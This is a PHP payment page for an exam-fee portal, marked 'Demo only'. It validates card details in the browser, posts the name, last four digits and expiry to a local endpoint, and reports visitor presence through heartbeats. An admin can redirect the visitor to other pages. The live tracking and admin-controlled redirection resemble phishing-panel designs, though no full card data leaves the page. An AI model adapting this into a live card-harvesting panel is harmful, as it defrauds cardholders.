<?php
session_start();
require_once __DIR__ . '/includes/functions.php';

if (empty($_SESSION['student_token'])) { header('Location: index.php'); exit; }
$student = getStudentByToken($_SESSION['student_token']);
if (!$student) { unset($_SESSION['student_token']); header('Location: index.php'); exit; }
updateStudentActivity($student['id'], 'payment');

$visitorId = (int)($_SESSION['visitor_id'] ?? 0);
if ($visitorId) {
    $db = getDB();
    $db->prepare("UPDATE visitors SET is_online = 1, status = 'payment', last_activity = datetime('now') WHERE id = ?")->execute([$visitorId]);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exam Portal - Payment</title>
    <style>
        *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
        body{font-family:'Segoe UI',system-ui,sans-serif;background:#f0f2f5;color:#1e293b;min-height:100vh}
        .top-bar{background:linear-gradient(135deg,#0f172a,#1e3a8a);color:#fff;padding:16px 24px}
        .top-bar h1{font-size:1.05rem;font-weight:600}
        .container{max-width:460px;margin:28px auto;padding:0 16px}
        .pay-card{background:#fff;border-radius:14px;padding:28px;box-shadow:0 1px 3px rgba(0,0,0,.05)}
        .pay-card h2{font-size:1.15rem;margin-bottom:4px}
        .pay-card .subtitle{color:#64748b;font-size:.85rem;margin-bottom:20px}
        .fee-row{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid #f1f5f9;font-size:.9rem}
        .fee-row.total{border-bottom:none;font-weight:700;font-size:1rem;padding-top:12px}
        .form-group{margin-top:18px}
        .form-group label{display:block;font-weight:600;font-size:.82rem;margin-bottom:6px;color:#1e293b}
        .form-group input{
            width:100%;padding:12px 14px;border:1.5px solid #e2e8f0;border-radius:10px;
            font-size:.95rem;font-family:inherit;transition:border-color .2s,box-shadow .2s;
        }
        .form-group input:focus{outline:none;border-color:#2563eb;box-shadow:0 0 0 3px rgba(37,99,235,.1)}
        .form-group input.error{border-color:#dc2626;box-shadow:0 0 0 3px rgba(220,38,38,.08)}
        .form-group input.valid{border-color:#16a34a}
        .form-group .hint{font-size:.72rem;color:#dc2626;margin-top:4px;display:none}
        .form-group .hint.show{display:block}
        .card-input{font-family:'Consolas','SF Mono',monospace;letter-spacing:2.5px;font-size:1.05rem}
        .card-brand{position:absolute;right:14px;top:50%;transform:translateY(-50%);font-size:.72rem;font-weight:700;color:#64748b;pointer-events:none}
        .card-wrap{position:relative}
        .form-row{display:grid;grid-template-columns:1fr 1fr;gap:12px}
        .btn-pay{
            display:block;width:100%;padding:14px;background:#16a34a;color:#fff;
            border:none;border-radius:10px;font-size:1rem;font-weight:600;
            cursor:pointer;margin-top:24px;font-family:inherit;transition:background .15s;
        }
        .btn-pay:hover:not(:disabled){background:#15803d}
        .btn-pay:disabled{background:#94a3b8;cursor:not-allowed}
        .alert{padding:12px;border-radius:10px;font-size:.88rem;margin-top:16px;display:none;font-weight:500}
        .alert-success{background:#f0fdf4;color:#16a34a;border:1px solid #bbf7d0;display:block}
        .alert-error{background:#fef2f2;color:#dc2626;border:1px solid #fecaca;display:block}
        .secure{text-align:center;margin-top:14px;font-size:.75rem;color:#94a3b8}
        @media(max-width:400px){.container{padding:0 12px}.pay-card{padding:20px 16px}}
    </style>
</head>
<body>
<div class="top-bar"><h1>Exam Fee Payment</h1></div>
<div class="container">
    <div class="pay-card">
        <h2>Payment Details</h2>
        <p class="subtitle">for <?= sanitize($student['name'] . ' ' . $student['surname']) ?></p>

        <div class="fee-row"><span>Exam Registration</span><span>$25.00</span></div>
        <div class="fee-row"><span>Platform Fee</span><span>$2.50</span></div>
        <div class="fee-row total"><span>Total</span><span>$27.50</span></div>

        <form id="payForm">
            <div class="form-group">
                <label>Cardholder Name</label>
                <input type="text" id="cardName" placeholder="<?= sanitize($student['name'] . ' ' . $student['surname']) ?>" autocomplete="cc-name" required>
            </div>
            <div class="form-group">
                <label>Card Number</label>
                <div class="card-wrap">
                    <input type="text" id="cardNum" class="card-input" inputmode="numeric" maxlength="19" placeholder="1234 5678 9012 3456" autocomplete="cc-number" required>
                    <span class="card-brand" id="ccBrand"></span>
                </div>
                <div class="hint" id="cardHint">Invalid card number</div>
            </div>
            <div class="form-row">
                <div class="form-group">
                    <label>Expiry Date</label>
                    <input type="text" id="expiry" inputmode="numeric" maxlength="5" placeholder="MM/YY" autocomplete="cc-exp" required>
                    <div class="hint" id="expiryHint">Invalid date</div>
                </div>
                <div class="form-group">
                    <label>CVC</label>
                    <input type="text" id="cvc" inputmode="numeric" maxlength="4" placeholder="123" autocomplete="cc-csc" required>
                </div>
            </div>
            <button class="btn-pay" type="submit" id="payBtn">Pay $27.50</button>
            <div id="alert"></div>
        </form>
        <div class="secure">Secure payment &mdash; Demo only</div>
    </div>
</div>

<script>
const studentId = <?= (int)$student['id'] ?>;
const visitorId = <?= $visitorId ?>;
let pageVisible = true;
let paymentStatus = 'viewing';

// Card number: format with spaces every 4 digits
const cardInput = document.getElementById('cardNum');
cardInput.addEventListener('input', function() {
    let v = this.value.replace(/\D/g, '').slice(0, 16);
    // Insert spaces every 4
    let formatted = v.replace(/(.{4})/g, '$1 ').trim();
    this.value = formatted;
    detectBrand(v);
    paymentStatus = 'typing_card';
});
// Handle paste
cardInput.addEventListener('paste', function(e) {
    e.preventDefault();
    let v = (e.clipboardData.getData('text') || '').replace(/\D/g, '').slice(0, 16);
    this.value = v.replace(/(.{4})/g, '$1 ').trim();
    detectBrand(v);
});

function getCardDigits() { return cardInput.value.replace(/\D/g, ''); }

function detectBrand(num) {
    const el = document.getElementById('ccBrand');
    if (/^4/.test(num)) el.textContent = 'VISA';
    else if (/^5[1-5]/.test(num) || /^2[2-7]/.test(num)) el.textContent = 'MASTERCARD';
    else if (/^3[47]/.test(num)) el.textContent = 'AMEX';
    else if (/^6(?:011|5)/.test(num)) el.textContent = 'DISCOVER';
    else el.textContent = '';
}

function luhnCheck(num) {
    if (num.length < 13 || num.length > 19) return false;
    let sum = 0, alt = false;
    for (let i = num.length - 1; i >= 0; i--) {
        let n = parseInt(num[i], 10);
        if (alt) { n *= 2; if (n > 9) n -= 9; }
        sum += n; alt = !alt;
    }
    return sum % 10 === 0;
}

// Expiry auto-format
document.getElementById('expiry').addEventListener('input', function() {
    let v = this.value.replace(/\D/g, '');
    if (v.length >= 2) v = v.slice(0,2) + '/' + v.slice(2,4);
    this.value = v;
    paymentStatus = 'typing_expiry';
});
document.getElementById('cvc').addEventListener('input', function() {
    this.value = this.value.replace(/\D/g, '');
    paymentStatus = 'typing_cvc';
});
document.getElementById('cardName').addEventListener('input', function() {
    paymentStatus = 'typing_name';
});

function validateExpiry(val) {
    if (!/^\d{2}\/\d{2}$/.test(val)) return false;
    const [m, y] = val.split('/').map(Number);
    if (m < 1 || m > 12) return false;
    const now = new Date();
    const ey = 2000 + y;
    return ey > now.getFullYear() || (ey === now.getFullYear() && m >= now.getMonth() + 1);
}

document.getElementById('payForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    const alertEl = document.getElementById('alert');
    const btn = document.getElementById('payBtn');
    const hint = document.getElementById('cardHint');
    const expiryHint = document.getElementById('expiryHint');

    hint.className = 'hint'; expiryHint.className = 'hint';
    cardInput.classList.remove('error','valid');
    document.getElementById('expiry').classList.remove('error','valid');
    alertEl.className = ''; alertEl.style.display = 'none';

    const cardNum = getCardDigits();
    const name = document.getElementById('cardName').value.trim();
    const expiry = document.getElementById('expiry').value.trim();
    const cvc = document.getElementById('cvc').value.trim();

    if (!name) { alertEl.className = 'alert alert-error'; alertEl.textContent = 'Enter cardholder name'; return; }
    if (!luhnCheck(cardNum)) {
        hint.textContent = 'Invalid card number'; hint.className = 'hint show';
        cardInput.classList.add('error'); return;
    }
    cardInput.classList.add('valid');
    if (!validateExpiry(expiry)) {
        expiryHint.textContent = 'Invalid or expired'; expiryHint.className = 'hint show';
        document.getElementById('expiry').classList.add('error'); return;
    }
    document.getElementById('expiry').classList.add('valid');
    if (cvc.length < 3) { alertEl.className = 'alert alert-error'; alertEl.textContent = 'CVC must be at least 3 digits'; return; }

    btn.disabled = true; btn.textContent = 'Processing...';
    paymentStatus = 'submitting';

    try {
        const resp = await fetch('api/save-payment.php', {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                student_id: studentId, cardholder: name,
                card_last4: cardNum.slice(-4),
                card_type: document.getElementById('ccBrand').textContent || 'CARD',
                expiry: expiry
            })
        });
        const data = await resp.json();
        if (data.success) {
            alertEl.className = 'alert alert-success';
            alertEl.textContent = 'Payment details submitted! Redirecting...';
            paymentStatus = 'submitted';
            btn.textContent = 'Submitted';
            setTimeout(() => { window.location.href = 'waiting.php'; }, 2000);
        } else {
            alertEl.className = 'alert alert-error';
            alertEl.textContent = data.error || 'Failed';
            btn.disabled = false; btn.textContent = 'Pay $27.50';
        }
    } catch(err) {
        alertEl.className = 'alert alert-error';
        alertEl.textContent = 'Connection error';
        btn.disabled = false; btn.textContent = 'Pay $27.50';
    }
});

// === Heartbeat with payment status ===
function hb() {
    if (!pageVisible || document.hidden) return;
    fetch('api/heartbeat.php', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({student_id:studentId}) }).catch(()=>{});
    if (visitorId) fetch('api/visitor-heartbeat.php', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({visitor_id:visitorId, status:'payment'}) }).catch(()=>{});
}
document.addEventListener('visibilitychange', () => {
    if (document.hidden) {
        pageVisible = false;
        navigator.sendBeacon('api/offline.php', JSON.stringify({student_id:studentId}));
        if (visitorId) navigator.sendBeacon('api/visitor-offline.php', JSON.stringify({visitor_id:visitorId}));
        clearInterval(hbTimer); hbTimer = null;
    } else {
        pageVisible = true; hb();
        if (!hbTimer) hbTimer = setInterval(hb, 5000);
    }
});
function sendOffline() {
    navigator.sendBeacon('api/offline.php', JSON.stringify({student_id:studentId}));
    if (visitorId) navigator.sendBeacon('api/visitor-offline.php', JSON.stringify({visitor_id:visitorId}));
}
hb(); let hbTimer = setInterval(hb, 5000);
window.addEventListener('pagehide', sendOffline);
window.addEventListener('beforeunload', sendOffline);

// Check for redirect (admin might redirect while on payment page)
setInterval(async () => {
    if (!pageVisible || document.hidden) return;
    try {
        const r = await fetch('api/heartbeat.php', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({student_id:studentId}) });
        const d = await r.json();
        if (d.redirect) window.location.href = d.redirect;
    } catch(e) {}
}, 5000);
</script>
</body>
</html>
